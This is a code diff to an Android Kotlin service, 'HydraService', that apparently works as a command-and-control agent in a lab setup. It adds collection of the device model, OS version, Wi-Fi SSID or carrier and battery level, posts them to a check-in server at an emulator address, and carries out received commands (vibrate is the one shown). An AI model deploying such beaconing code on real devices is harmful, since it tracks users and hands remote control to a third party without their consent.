@@ -6,7 +6,12 @@ import android.app.NotificationManager
 import android.app.Service
 import android.content.Context
 import android.content.Intent
+import android.content.IntentFilter
+import android.net.ConnectivityManager
+import android.net.NetworkCapabilities
+import android.net.wifi.WifiManager
 import android.os.*
+import android.telephony.TelephonyManager
 import android.util.Log
 import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaType
@@ -63,9 +68,47 @@ class HydraService : Service() {
         startForeground(1, notification)
     }
 
+    // --- Added: Telemetry Methods ---
+    private fun getNetworkName(): String {
+        return try {
+            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+            val network = cm.activeNetwork ?: return "Disconnected"
+            val capabilities = cm.getNetworkCapabilities(network) ?: return "Disconnected"
+
+            if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)) {
+                val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
+                val info = wifiManager.connectionInfo
+                val ssid = info.ssid.replace("\"", "")
+                if (ssid == "<unknown ssid>") "WiFi (No Permission)" else ssid
+            } else if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)) {
+                val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
+                telephonyManager.networkOperatorName ?: "Cellular"
+            } else {
+                "Unknown Transport"
+            }
+        } catch (e: Exception) {
+            "Network Error"
+        }
+    }
+
+    private fun getBatteryLevel(): String {
+        val batteryStatus: Intent? = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
+        val level = batteryStatus?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
+        val scale = batteryStatus?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
+        return if (level != -1 && scale != -1) "${(level * 100 / scale.toFloat()).toInt()}%" else "Unknown"
+    }
+
     private fun performCheckIn() {
         val url = "https://10.0.2.2:8443/checkin/ANDROID-HEAD-01?platform=android"
-        val body = "{}".toRequestBody("application/json".toMediaType())
+        
+        // Build the Telemetry JSON
+        val telemetry = JSONObject()
+        telemetry.put("hostname", "${Build.MANUFACTURER} ${Build.MODEL}")
+        telemetry.put("os_version", "Android ${Build.VERSION.RELEASE}")
+        telemetry.put("network", getNetworkName())
+        telemetry.put("battery", getBatteryLevel())
+
+        val body = telemetry.toString().toRequestBody("application/json".toMediaType())
         val request = Request.Builder().url(url).post(body).build()
 
         client.newCall(request).enqueue(object : Callback {
@@ -93,10 +136,10 @@ class HydraService : Service() {
                 Log.i(TAG, "[!] Received Command: $action")
 
                 if (action == "vibrate") {
-                    val duration = cmd.optLong("duration", 1000L) // Default 1s if null
+                    // Using optLong from your original code
+                    val duration = cmd.optLong("duration", 1000L) 
                     val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
                     
-                    // This log MUST appear if the code reaches the execution line
                     Log.i(TAG, ">> [ACTION] Executing Command: Vibrate ($duration ms)")
 
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
